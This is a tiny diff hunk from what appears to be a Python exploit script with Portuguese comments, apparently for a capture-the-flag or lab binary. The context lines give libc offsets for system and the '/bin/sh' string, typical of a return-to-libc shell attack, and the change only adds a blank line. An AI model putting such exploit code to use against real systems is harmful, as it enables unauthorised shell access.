@@ -32,6 +32,7 @@ system_lib_offset = 0x48150
 # Offset da string "/bin/sh" na biblioteca
 sh_lib_offset = 0x1bd0f5
 
+
 def send_message(p, message):
     p.recvuntil(b">")
     p.sendline(b"e")
